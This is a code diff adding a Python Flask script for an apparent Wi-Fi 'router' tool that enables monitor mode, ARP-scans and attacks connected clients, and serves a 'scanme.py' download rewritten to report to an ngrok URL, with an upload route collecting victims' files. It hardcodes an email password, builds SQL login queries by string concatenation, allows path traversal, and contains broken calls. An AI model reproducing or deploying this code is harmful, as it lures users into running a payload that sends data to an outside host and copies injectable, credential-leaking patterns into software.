@@ -1,0 +1,267 @@
+#!/bin/python3
+
+# predefined modules
+import psutil
+import os
+import subprocess
+import pprint
+import copy
+import sqlite3 as sql
+
+from termcolor import colored
+from flask import Flask,render_template,request,jsonify,session
+from flask_ngrok import run_with_ngrok
+from threading import Thread
+from time import sleep
+from werkzeug.datastructures import FileStorage
+from scapy.all import *
+# created modules
+from static.modules.basic import *
+from static.modules.pentest import *
+from static.modules.packages import *
+from static.modules.wifi import *
+
+# CLASSES
+# Main class
+class ROUTER:
+    def __init__(self):
+        self.wrun,self.prun,self.frun,self.wifi=True,True,True,{}
+        self.SSID='testing'
+        self.BSSID=''
+        self.IP='192.168.28.1'
+        self.drange='192.168.28.30'
+        self.dtime='24'
+        self.PASSWD='12345678'
+        self.BASEDIR=['/root/']
+        self.result={}
+        self.mail="fknown0@gmail.com"
+        self.passwd="(#*7$iva*#)"
+        self.num=1
+        self.BS=BASIC()
+        self.url=[]
+        self.clients=[]
+        self.arp={}
+        self.ipath=defaultdict(list)
+        self.ppath=defaultdict(list)
+        self.lp='static/logs/info/'
+        self.pp='static/logs/evidence/'
+        self.clients=open('static/APconf/accept','r').readlines()
+
+    def pinit(self):
+        self.HO=HACKOUT()
+        # wifi scanner
+        print(colored('[i] information, [+] process information, [*] warning, [-] error','blue'))
+        sleep(0.5)
+        print(colored('[i] press CTRL+C for quit','blue'))
+        sleep(0.5)
+        print(colored('[+] Selecting interface','blue'))
+        sleep(0.5)
+        self.network,self.interface,self.run=self.HO.iface[0],[self.HO.iface[1],self.HO.iface[2]],self.HO.iface[3]
+        print(colored('[+] Selected interfaces : ','blue'),colored(self.network+' '+str(self.interface),'green'))
+        sleep(0.5)
+        self.WF=WIFI(self.interface[1])
+        self.AP=AP(self.interface[0],self.network,self.drange,self.dtime)
+        self.athread=Thread(target=self.AP.start,args=(self.SSID,self.PASSWD,))
+        self.athread.start()
+        self.BSSID=psutil.net_if_addrs()[self.interface[0]][1].address
+        sleep(0.5)
+        self.w=Thread(target=self.wstart)
+        self.p=Thread(target=self.pstart)
+        self.f=Thread(target=self.fstart)
+        # Enable monitor mode
+        os.system('ifconfig '+self.interface[1]+' down')
+        os.system('iwconfig '+self.interface[1]+' mode monitor')
+        os.system('ifconfig '+self.interface[1]+' up')
+        print(colored('[+] Monitor mode enabled in ','blue'),colored(self.interface,'green'))
+        sleep(0.5)
+        subprocess.Popen("qterminal -e './static/source/ngrok start -all'",shell=True)
+        self.url=self.BS.msend(self.mail,self.passwd)
+        cont=open('static/modules/fileanalysis.py','r').readlines()
+        cont[-1]="HACKIN('"+self.url[0]+"')"
+        open('static/modules/fileanalysis.py','w').write(''.join(cont))
+
+    def start(self):
+        try:
+            pass
+            self.BS.rdesk()
+            self.w.start()
+            self.p.start()
+            self.f.start()
+        except Exception as e:
+            print(e)
+            self.stop()
+
+    def wstart(self):
+        try:
+            while self.wrun:
+                wthread=Thread(target=self.WF.start)
+                wthread.start()
+                while wthread.is_alive(): pass
+                self.result[1]=copy.copy([self.WF.info,self.arp])
+                self.result[2]=copy.copy(self.HO.clientinfo)
+                self.result[3]=copy.copy([self.ipath,self.ppath])
+                # pprint.pprint(self.result)
+        except Exception as e: print(e)
+
+    def pstart(self):
+        clients=[]
+        clientinfo=defaultdict(dict)
+        try:
+            while self.prun:
+                self.arp.clear()
+                for i,ans in enumerate(self.HO.arp()):
+                    self.arp[i+1]={'ip':ans[i].psrc,'mac':ans[i].hwsrc}
+                    cthread=Thread(target=self.HO.start,args=(ans[i].psrc,ans[i].hwsrc,))
+                    cthread.start()
+                    clients.append(cthread)
+                else:
+                    self.arp[0]={'ip':self.IP,'mac':self.BSSID}
+                    cthread=Thread(target=self.HO.start,args=(self.IP,self.BSSID,))
+                    cthread.start()
+                    clients.append(cthread)
+                for t in clients:
+                    while t.is_alive(): pass
+        except Exception as e: print(e)
+
+    def fstart(self):
+        # try:
+        cont=open('static/modules/forensics.py','r').readlines()
+        cont[-1]="DFORENSICS('"+self.network+"',"+str(self.clients)+",'"+self.BSSID+"',"+str(self.num)+").pmstart()"
+        open('static/modules/forensics.py','w').write(''.join(cont))
+        self.DF=subprocess.Popen('python3 static/modules/forensics.py',shell=True)
+        while self.DF.poll() is None:
+            sleep(5)
+            for p,d,ff in os.walk(self.lp):
+                for f in ff:
+                    self.ipath[f]=[os.path.join(p,f).replace('/','|'),None]
+            for p,d,ff in os.walk(self.pp):
+                for f in ff:
+                    self.ppath[f]=[os.path.join(p,f).replace('/','|'),None]
+        # except Exception as e: print(e)
+
+    def stop(self):
+        self.wstop()
+        self.pstop()
+        self.fstop()
+        #Disable monitor mode
+        os.system('ifconfig '+self.interface[1]+' down')
+        os.system('iwconfig '+self.interface[1]+' mode managed')
+        os.system('ifconfig '+self.interface[1]+' up')
+        print(colored('[+] Monitor mode disabled in ','blue'),colored(self.interface,'green'))
+
+    def wstop(self):
+        self.WF.run=False
+        self.wrun=False
+        if self.wthread.is_alive(): main.w.join()
+
+    def pstop(self):
+        self.prun=False
+        if self.pthread.is_alive(): main.p.join()
+
+    def fstop(self):
+        self.DF.terminatte()
+
+    def xlsxWriter(self,path):
+        fpath='static/logs/xlsx/'+path.split('/')[-1].replace('.json','.xlsx')
+        jd={}
+        od=[]
+        data=json.load(open(path,'r'))
+        for d in data.keys():
+            try:pd.DataFrame(data[d])
+            except:jd[d]=[data[d]]
+        jd['scanned path']=data['files']['scanned path']
+        jd['total']=data['files']['total']
+        od.append(['System',pd.DataFrame(jd)])
+        od.append(['Storage',pd.DataFrame(data['storage'])])
+        od.append(['Process',pd.DataFrame(data['process'])])
+        for d in data['files']['detail']:od.append([d,pd.DataFrame(data['files']['detail'][d])])
+        writer=pd.ExcelWriter(fpath,engine='xlsxwriter')
+        for dt in od:dt[1].to_excel(writer,sheet_name=dt[0],startrow=0,startcol=0)
+        writer.save()
+
+    # Configuration process
+    def config(self,ip,mac):
+        # Chrome selenium driver installation
+        yield 'Chrome driver installing'
+        chromedriver_autoinstaller.install()
+        yield 'Chrome driver installed'
+        # client configuration
+        answered=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.interfaces[self.iface[1]][1]),iface=self.iface[1],timeout=1,verbose=False)[0]
+        for i, ans in enumerate(answered): self.clients[i]=[ans[1].psrc,ans[1].hwsrc]
+        yield self.clients
+
+app=Flask(__name__)
+
+@app.route('/',methods=['POST','GET'])
+def index():
+    session['admin']=None
+    if request.method=='POST':
+        con=sql.connect('static/source/database.db')
+        cur=con.cursor()
+        userid=request.form['userid']
+        passwd=request.form['passwd']
+        cur.execute('select count(*) from login where name="'+userid+'" and password="'+passwd+'";')
+        if cur.fetchall()[0][0] == 1:
+            session['admin']=userid
+            return render_template('monitor.html')
+        else: return render_template('index.html',warning='invalid user ID or password')
+    else: return render_template('index.html',warning='')
+
+@app.route('/config/',methods=['POST','GET'])
+def config():
+    if request.method=='POST': pass
+    else: yield render_template('config.html',main.config())
+    # open('static/APconf/accept','a').write(ans[1].hwsrc+'\n')
+
+@app.route('/monitor/')
+def monitor():
+    if session['admin'] is not None: return jsonify(main.result)
+    else: return jsonify('Unauthorized access')
+
+@app.route('/fileview/<fname>')
+def fileview(fname):
+    cont=[]
+    print(fname.replace('|','/'))
+    if session['admin'] is not None:
+        with open(fname.replace('|','/'),'r') as fp:cont=fp.readlines()
+        return jsonify(cont[(len(cont)-10):-1])
+    else: return jsonify('Unauthorized access')
+
+@app.route('/static/')
+def scanme():
+    return "<a style='position:absolute;top:80%;left:50%;transform:translate(-50%,-50%);padding:1rem;background:linear-gradient(65deg,#F4D03F,#FCF3CF);text-decoration:none;color:black;border-radius:0.3rem;box-shadow:0px 0px 10px 2px black;font-size:large;margin:auto;align-self:center;text-shadow:2px 2px 5px black;' download='scanme.py' href='modules/fileanalysis.py'>Download</a>"
+
+@app.route('/upload/<fname>',methods=['POST'])
+def upload(fname):
+    try:
+        FileStorage(request.stream).save('static/logs/system/'+fname)
+        # open('static/logs/system/'+fname,'w+').write(request.files)
+        return jsonify('filesaved to the server and system')
+    except:return jsonify('Something went wrong')
+
+@app.route('/start/<option>')
+def start(option):
+    if session['admin'] is not None:
+        if option == 'all': main.start()
+        elif option == 'wifi': main.wstart()
+        elif option == 'pentest': main.pstart()
+        elif option == 'forensic': main.fstart()
+        elif option == 'rdesk': main.BS.rdesk()
+    else: return jsonify('Unauthorized access')
+
+@app.route('/stop/<option>')
+def stop(option):
+    if session['admin'] is not None:
+        if option == 'all': main.stop()
+        elif option == 'wifi': main.wstop()
+        elif option == 'pentest': main.pstop()
+        elif option == 'forensic': main.fstop()
+    else: return jsonify('Unauthorized access')
+
+if __name__=='__main__':
+    main=ROUTER()
+    main.pinit()
+    Thread(target=main.start).start()
+    app.secret_key = os.urandom(42)
+    # app.debug=True
+    app.run()
